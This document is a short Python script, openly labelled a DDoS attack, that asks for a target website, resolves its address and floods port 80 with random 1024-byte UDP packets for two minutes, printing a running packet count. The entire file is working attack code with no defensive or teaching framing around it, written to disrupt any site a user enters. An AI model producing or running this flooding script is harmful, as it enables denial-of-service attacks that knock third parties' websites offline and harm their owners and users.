import socket
import random
import time

def ddos_attack():
    site = input("Enter the website you want to attack: ")
    ip = socket.gethostbyname(site)
    port = 80
    timeout = time.time() + 60 * 2
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent", sent, "packets to", ip, "through port", port)
        except KeyboardInterrupt:
            print("\nStopped the DDoS attack.")
            break
        except socket.gaierror:
            print("\nHostname could not be resolved.")
            break
        except socket.error:
            print("\nServer not responding.")
            break

ddos_attack()